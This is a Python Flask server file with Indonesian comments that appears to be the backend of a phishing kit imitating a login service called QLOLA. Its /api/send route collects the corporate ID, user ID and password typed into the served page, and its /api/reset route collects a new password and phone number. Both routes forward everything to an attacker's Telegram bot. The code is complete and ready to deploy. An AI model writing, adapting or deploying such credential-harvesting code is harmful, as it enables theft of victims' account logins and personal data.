from flask import Flask, request, jsonify, send_from_directory
import os
import urllib.request
import json

app = Flask(__name__)

# Base directory aman untuk Vercel (root project)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ==========================================
# 1. KONFIGURASI TELEGRAM
# ==========================================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')


def send_to_telegram(pesan):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        raise ValueError("Token atau Chat ID Telegram belum diatur di Vercel!")

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": pesan,
        "parse_mode": "HTML"
    }).encode('utf-8')

    req = urllib.request.Request(
        url,
        data=payload,
        headers={'Content-Type': 'application/json'}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.read()


# ==========================================
# 2. API ROUTES
# ==========================================
@app.route('/api/send', methods=['POST'])
def api_send():
    data = request.get_json(silent=True) or {}
    pesan = (
        f"🔐 <b>QLOLA LOGIN</b>\n\n"
        f"🏢 <b>Corporate:</b> {data.get('corpId', '-')}\n"
        f"👤 <b>User:</b> {data.get('userId', '-')}\n"
        f"🔑 <b>Sandi:</b> {data.get('password', '-')}"
    )
    try:
        send_to_telegram(pesan)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print("Error Telegram Login:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/api/reset', methods=['POST'])
def api_reset():
    data = request.get_json(silent=True) or {}
    pesan = (
        f"🔄 <b>QLOLA RESET PASSWORD</b>\n\n"
        f"🔑 <b>Sandi Baru:</b> {data.get('newPassword', '-')}\n"
        f"📱 <b>No HP:</b> +62 {data.get('phone', '-')}"
    )
    try:
        send_to_telegram(pesan)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print("Error Telegram Reset:", e)
        return jsonify({"status": "error", "message": str(e)}), 500


# ==========================================
# 3. STATIC FILES
# ==========================================
@app.route('/')
def home():
    return send_from_directory(BASE_DIR, 'index.html')


@app.route('/<path:path>')
def serve_static(path):
    file_path = os.path.join(BASE_DIR, path)
    if os.path.isfile(file_path):
        return send_from_directory(BASE_DIR, path)
    return "File tidak ditemukan", 404
